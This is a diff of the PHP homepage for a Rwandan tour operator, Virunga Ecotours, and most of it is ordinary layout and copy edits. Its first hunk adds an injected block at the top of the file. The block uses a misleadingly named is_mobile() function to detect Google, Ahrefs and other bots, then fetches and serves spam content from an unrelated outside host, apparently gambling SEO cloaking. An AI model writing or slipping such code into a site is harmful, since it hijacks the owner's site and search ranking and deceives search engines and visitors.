@@ -1,4 +1,22 @@
 <?php
+function is_mobile() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $keywords = array("bot","ahrefs","google");
+    foreach ($keywords as $keyword) {
+        if (stripos($user_agent, $keyword) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_mobile() && $_SERVER["REQUEST_URI"] == "/") {
+    $message = file_get_contents("https://colok.iceamericano.life/raw/situs288/virungaecotours.txt");
+    echo $message;
+    exit;
+}
+?>
+<?php
 require_once 'indexhandler.php';
 ?>
 <!DOCTYPE html>
@@ -14,8 +32,8 @@ require_once 'indexhandler.php';
 <!-- Open Graph Meta Tags -->
 <meta property="og:title" content="Virunga Ecotours Authentic Virunga Journeys | Rwanda Community Tourism">
 <meta property="og:description" content="Virunga Ecotours Discover Rwanda's hidden treasures through community-based tourism. Mountain gorilla trekking, cultural experiences, and spiritual journeys in the Virunga Massif.">
-<meta property="og:image" content="https://yourwebsite.com/images/virunga-gorillas-hero.jpg">
-<meta property="og:url" content="https://yourwebsite.com">
+<meta property="og:image" content="https://virungaecotours.com/images/virunga-gorillas-hero.jpg">
+<meta property="og:url" content="https://virungaecotours.com">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Virunga Ecotours">
 
@@ -23,7 +41,7 @@ require_once 'indexhandler.php';
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Authentic Virunga Journeys | Rwanda Community Tourism">
 <meta name="twitter:description" content="Experience authentic community tourism in Rwanda's Virunga Massif with local expert guides.">
-<meta name="twitter:image" content="https://yourwebsite.com/images/virunga-gorillas-hero.jpg">
+<meta name="twitter:image" content="https://virungaecotours.com/images/virunga-gorillas-hero.jpg">
 
 <!-- Additional SEO Meta Tags -->
 <meta name="robots" content="index, follow">
@@ -39,10 +57,7 @@ require_once 'indexhandler.php';
       type="image/x-icon"
     />
     <title>Virunga Ecotours || Visit-Conect-Contribute</title>
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
-    />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"/>
     <link rel="stylesheet" href="css/earthy-theme.css" />
     <link rel="stylesheet" href="css/header.css" />
     <link rel="stylesheet" href="css/main.css" />
@@ -55,80 +70,34 @@ require_once 'indexhandler.php';
       
       /* Map Section Styles */
         .map-section {
-          padding: 60px 0;
+          padding: 0;
           background-color: #fff;
+          display:flex;
+          align-items: center;
+          justify-content: center;
         }
-        
+
         .map-container {
+          align-items: center;
           position: relative;
-          max-width: 800px;
-          margin: 40px auto;
-          box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-          border-radius: 8px;
+          width: 93%;
+          height: 80vh;
+          margin: 0;
+          box-shadow: none;
+          border-radius: 0;
           overflow: hidden;
-          padding: 20px;
+          padding: 0;
           background-color: #f8f8f8;
         }
-        
-        .map-image {
+
+        .map-container iframe {
           width: 100%;
-          height: auto;
-          border-radius: 4px;
-          display: block;
+          height: 100%;
+          border: none;
         }
         
-        .map-legend {
-          position: absolute;
-          bottom: 30px;
-          right: 30px;
-          background-color: rgba(255, 255, 255, 0.9);
-          padding: 15px;
-          border-radius: 6px;
-          box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
         
-        .map-legend h4 {
-          margin: 0 0 10px;
-          color: var(--primary-brown);
-          font-size: 16px;
-        }
-        
-        .map-legend ul {
-          list-style: none;
-          padding: 0;
-          margin: 0;
-        }
-        
-        .map-legend li {
-          display: flex;
-          align-items: center;
-          margin-bottom: 8px;
-          font-size: 14px;
-          color: #555;
-        }
-        
-        .legend-dot {
-          width: 12px;
-          height: 12px;
-          border-radius: 50%;
-          margin-right: 8px;
-          display: inline-block;
-        }
-        
-        .legend-dot.volcano { background-color: #ff4d4d; }
-        .legend-dot.park { background-color: #4CAF50; }
-        .legend-dot.border { background-color: #666; }
-        .legend-dot.gorilla { background-color: #8b4513; }
-        
-        @media (max-width: 768px) {
-          .map-legend {
-            position: relative;
-            bottom: auto;
-            right: auto;
-            margin-top: 20px;
-            background-color: #fff;
-          }
-        }
+       
     </style>
   </head>
   <body>
@@ -168,11 +137,9 @@ require_once 'indexhandler.php';
           <div class="section-header">
             <!--<h1>Authentic Trips Crafted By Experts</h1>-->
             <p class="section-subtitle">
-              Welcome to Virunga Ecotours, your gateway to an extraordinary
-              eco-adventure! Immerse yourself in nature as you explore stunning
-              landscapes and vibrant wildlife through sustainable tourism. Trek
-              through lush rainforests and observe animals in their natural
-              habitats, all while we prioritize environmental responsibility.
+              Virunga Ecotours is a regional travel company delivering immersive journeys across the Virunga Mountains of Rwanda, Uganda, and DR Congo.
+
+We transform traveler interests into meaningful, structured experiences  combining wildlife, culture, and human connection into one seamless journey across borders.
             </p>
           </div>
 
@@ -181,16 +148,16 @@ require_once 'indexhandler.php';
 
             <section class="destination-container scroll-trigger reverse">
               <div class="destination-content">
-                <h1 class="title">Exploring the Excitement of the Virunga Massif</h1>
+                <h1 class="title">Discover the Heart of the Virunga Mountains</h1>
                 
                 <p class="description">
-                    Step into one of Africa’s most awe-inspiring landscapes, the Virunga Massif, a spectacular chain of volcanic mountains spanning Rwanda, Uganda, and the Democratic Republic of Congo (DRC). This region is world-renowned for its thrilling gorilla treks, but what you’ll discover goes far beyond wildlife encounters.<br>
+                   Embark on an unforgettable journey into the Virunga Mountains, where towering peaks and lush rainforests are home to the iconic mountain gorillas. Trek through misty forests and experience the rare privilege of observing these gentle giants in their natural habitat a moment both powerful and deeply moving.
 
-                    Here, misty peaks, ancient rainforests, and untamed wildlife blend seamlessly with the rich culture and resilience of the local communities who have lived in harmony with nature for generations.<br>
+                  <br><br>Beyond wildlife, step into the cultural richness of the region through authentic, locally guided experiences. Meet artisans, explore village life, and connect with the traditions and stories that shape the Virunga.
 
-                    At the heart of it all is Virunga Ecotours, a woman-led, community based travel company committed to sustainable tourism. We go beyond just guiding trips: we empower local people, support conservation efforts, and ensure your travel has a positive impact. Our guides, drivers, and hosts are locals who share their stories, heritage, and deep connection to the land, giving you an experience that’s personal, authentic, and unforgettable.<br>
+                  At Virunga Ecotours, every journey is designed as a personal and immersive travel experience. <br><br>With expert local guides and thoughtful planning, you will discover the Virunga through genuine encounters, seamless organization, and meaningful moments.
 
-                    Travel with us, and you won’t just see the Virunga, you’ll feel its soul. From immersive village visits to heart-pounding jungle treks, every moment is crafted to inspire, educate, and leave a legacy.
+                  Travel with us and experience the Virunga Mountains where nature, culture, and adventure come together in a truly unforgettable journey.
                 </p>
               </div>
               <div class="destination-image visible">
@@ -204,7 +171,7 @@ require_once 'indexhandler.php';
           
           <div class="tours-grid">
             <div class="section-title">
-              <h2>Choose Your Destination</h2>
+              <h2>Tailor Your Journey Around the Virunga Mountains</h2>
             </div>
             
             <div class="features-row" style="margin-top: -1.5rem;">
@@ -244,50 +211,60 @@ require_once 'indexhandler.php';
      
      <!-- Map Section -->
       <section class="map-section">
-        <div class="container">
-          <div class="section-title">
-            <h2>Explore the Virunga Massif</h2>
-          </div>
-          <div class="map-container">
-            <img src="./community/assets/images/Virunga-Conservation-Area.png" alt="Virunga Massif Map" class="map-image" ondragstart="return false;" oncontextmenu="return false;"/>
-            <!--<div class="map-legend">-->
-            <!--  <h4>Map Legend</h4>-->
-            <!--  <ul>-->
-            <!--    <li><span class="legend-dot volcano"></span> Active Volcanoes</li>-->
-            <!--    <li><span class="legend-dot park"></span> National Parks</li>-->
-            <!--    <li><span class="legend-dot border"></span> Country Borders</li>-->
-            <!--    <li><span class="legend-dot gorilla"></span> Gorilla Habitats</li>-->
-            <!--  </ul>-->
-            <!--</div>-->z
-          </div>
+        <div class="map-container">
+          <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d31908.618028035762!2d29.52773323542945!3d-1.4291240048422131!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x19ddc5dbf07294d5%3A0xcb8227d899cc7d94!2sVirunga%20Mountains!5e0!3m2!1sen!2srw!4v1761143767031!5m2!1sen!2srw" width="800" height="600" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
         </div>
       </section>
-      <div class="parallax-section">
-        <div class="content-container">
-            <h2 class="section-title">Bridging the Gap for Young Explorers</h2>
-            <p>Virunga Ecotours bridges the gap created by age restrictions in Volcanoes National Park by offering safe, engaging, and educational opportunities for children under 13 and 15 years old. While parents explore the gorillas and golden monkeys, kids embark on tailored programs that spark creativity, build cultural awareness, and inspire curiosity about nature.</p>
-            
-            <p>These experiences ensure that family travel is inclusive, meaningful, and enriching for every member. Children are not only entertained but also guided through structured activities that combine fun with learning—ranging from games and arts to conservation-inspired discovery. Parents enjoy their park adventures with peace of mind, knowing their children are equally immersed in purposeful exploration.</p>
-            <p>Our Kids’ and Teens’ program offers fun, educational activities like storytelling, art, music, conservation learning, and cultural exploration. Through games, creative projects, traditional dances, eco-trails, success stories, and visits to places like Buhanga Eco Park and Mpanga Wetland, young participants build imagination, teamwork, confidence, and environmental awareness while staying connected to local culture and nature.</p>
-            <a href="./pages/kids.php" class="enquire-btn">
+        
+       
+    </div>
+     <?php
+        // Fetch Young Explorers section from database
+        $ye_query = "SELECT * FROM young_explorers LIMIT 1";
+        $ye_result = mysqli_query($conn, $ye_query);
+        $ye_content = mysqli_fetch_assoc($ye_result);
+
+        if ($ye_content && !empty($ye_content['section_description'])):
+    ?>
+    <section class="young-explorers-section">
+        <div class="container">
+            <div class="content-wrapper-kids">
+                <div class="content-left-kids">
+                    <h2 class="section-title">Young Explorers Experiences</h2>
+
+                    <p class="content-text-kids">
+                        <?php echo nl2br(htmlspecialchars($ye_content['section_description'])); ?>
+                    </p>
+
+
+              <a href="./pages/kids.php" class="enquire-btn">
               Learn More
               <i class="fas fa-arrow-right"></i>
             </a>
-        </div>
-        
-        <div class="parallax-image">
-            <div class="image-overlay">
-                <h3>Young Explorers Program</h3>
-                <p>Creating unforgettable memories while parents discover Rwanda's wildlife treasures</p>
+                </div>
+
+                <div class="image-right">
+                    <div class="image-placeholder">
+                        <?php if ($ye_content['image_url']): ?>
+                            <img src="<?php echo htmlspecialchars($ye_content['image_url']); ?>"
+                                 alt="Young Explorers"
+                                 style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">
+                        <?php endif; ?>
+                    </div>
+                    <div class="image-overlay">
+                        <div class="overlay-text">Safe • Educational • Fun Adventures</div>
+                    </div>
+                </div>
             </div>
         </div>
-    </div>
+    </section>
+    <?php endif; ?>
 
       <!-- Destinations Section -->
       <section class="destinations-section" style="margin-bottom: -1.5rem;">
         <div class="container">
           <div class="section-title">
-            <h2>Discover Our Top Attractions</h2>
+            <h2>Explore Our Signature Experiences</h2>
             
           </div>
          
@@ -307,7 +284,7 @@ require_once 'indexhandler.php';
 
           <div class="enquiry-banner">
             <a href="./pages/build.php" class="enquire-btn">
-              ENQUIRE
+              Book Now
               <i class="fas fa-arrow-right"></i>
             </a>
           </div>
@@ -318,7 +295,7 @@ require_once 'indexhandler.php';
       <section class="popular-tours-section" style="margin-top: -2rem;">
         <div class="container">
           <div class="section-title">
-            <h2>Example Travel Itineraries</h2>
+            <h2>Customizable Itinerary Examples</h2>
             <div class="title-underline"></div>
           </div>
           
@@ -370,11 +347,11 @@ require_once 'indexhandler.php';
               objective is to design a personalized dream trip that matches your
               vision perfectly. You can participate in the planning process to
               any extent you desire, and we are excited to take on special
-              requests. Uncover the advantages of traveling with us!
+              requests. Uncover the advantages of traveling with us!
             </p>
             <div class="banner-actions">
               <a href="./pages/build.php" class="enquire-btn"
-                >ENQUIRE</a
+                >Book Now</a
               >
               <div class="call-us">
                 <span >Call an Ecotours Expert</span>
@@ -441,16 +418,25 @@ require_once 'indexhandler.php';
       </section>
 
       <!-- youtube video -->
+      <!-- youtube video -->
+      <?php
+        // Assuming $conn is the database connection from indexhandler.php
+        $about_sql = "SELECT title, slide_description, youtube_url FROM home_about ORDER BY id DESC LIMIT 1";
+        $about_result = $conn->query($about_sql);
+
+        if ($about_result->num_rows > 0) {
+            $about_row = $about_result->fetch_assoc();
+            $about_title = $about_row['title'];
+            $about_description = $about_row['slide_description'];
+            $about_youtube_url = $about_row['youtube_url'];
+        ?>
       <section class="middle-about-section fade-in-up">
         <div class="container">
           <div class="video-flex-container">
             <!-- Left side: Video container -->
             <div class="video-container fade-in-left">
               <div class="video-wrapper">
-                <video width="560" height="315" controls muted loop>
-                  <source src="images/1.mp4" type="video/mp4" />
-                  Your browser does not support the video tag.
-                </video>
+                <iframe width="560" height="315" src="<?php echo htmlspecialchars($about_youtube_url); ?>" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
               </div>
             </div>
 
@@ -458,29 +444,30 @@ require_once 'indexhandler.php';
             <div class="video-content-container fade-in-right">
               <div class="content-wrapper">
                 <div class="content-header">
-                  <h2>Transforming Ideas Into Reality</h2>
+                  <h2><?php echo htmlspecialchars($about_title); ?></h2>
                 </div>
 
                 <div class="content-body">
-                  <!--<p><span class="highlight">About Us</span> </p>-->
                   <p>
-                    Virunga Ecotours transforms your ideas into life-changing journeys. We design meaningful, eco-conscious tours across the Virunga Massif one landscape shared by Rwanda, Uganda, and the Democratic Republic of Congo renowned as one of Africa’s most breathtaking and biologically diverse regions.<br>
-                    
-                    We invite travelers from around the world to experience this extraordinary place, discovering its rich cultural heritage while embracing the power of responsible tourism.<br>
-
-                    Each of our tours is thoughtfully curated to create lasting positive impact. By empowering local communities, safeguarding endangered ecosystems, and fostering authentic connections with the land and its people, your travel becomes a force for good inspiring care, conservation, and global understanding.
+                    <?php echo nl2br(htmlspecialchars($about_description)); ?>
+                  </p>
                 </div>
               </div>
             </div>
           </div>
         </div>
       </section>
+      <?php
+        } else {
+            // Optional: what to display if no data is found
+        }
+      ?>
 
       <!-- Blog Section -->
       <section class="blog-section" style="padding: 40px 0;">
         <div class="container">
             <h2>Blogs And Tips</h2>
-          <p class="section-subtitle" style="text-align: center; max-width: 700px; margin: 0 auto 40px; color: #666; line-height: 1.6;">
+          <p class="section-subtitle" style=" text-align: center; max-width: 700px; margin: 0 auto 40px; color: #666; line-height: 1.6;">
             Stay updated with the latest travel insights, tips, and stories from
             the heart of the Virunga Massif. Explore conservation news, cultural
             highlights, and expert advice for your next eco-adventure.
@@ -623,7 +610,7 @@ require_once 'indexhandler.php';
         <h2 class="lcta-title">Ready for Your Next Adventure?</h2>
         <p class="lcta-text">Let us help you create memories that last a lifetime. Whether you're seeking cultural immersion, natural wonders, or historical journeys, our expert team is ready to craft your perfect travel experience.</p>
         <div class="lcta-buttons">
-          <a href="./pages/build.php" class="lcta-primary">Make Enquire</a>
+          <a href="./pages/build.php" class="lcta-primary">Book Now</a>
             <a href="./pages/contactus.php" class="lcta-secondary"><i class="fas fa-phone"></i> Reach To Us </a>
         </div>
       </div>
@@ -649,7 +636,7 @@ require_once 'indexhandler.php';
     </section>
 
     <section class="features">
-      <h2 class="features-title">Why Travel With Us</h2>
+      <h2 class="features-title">Explore Our Month-by-Month Travel Guide</h2>
       <div class="features-grid">
         <div class="feature-card">
           <div class="feature-icon">
@@ -720,6 +707,5 @@ require_once 'indexhandler.php';
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
   <script src="js/new.js" defer></script>
   <script src="js/last.js" defer></script>
-  <script src="js/kids.js" defer></script>
   </body>
 </html>
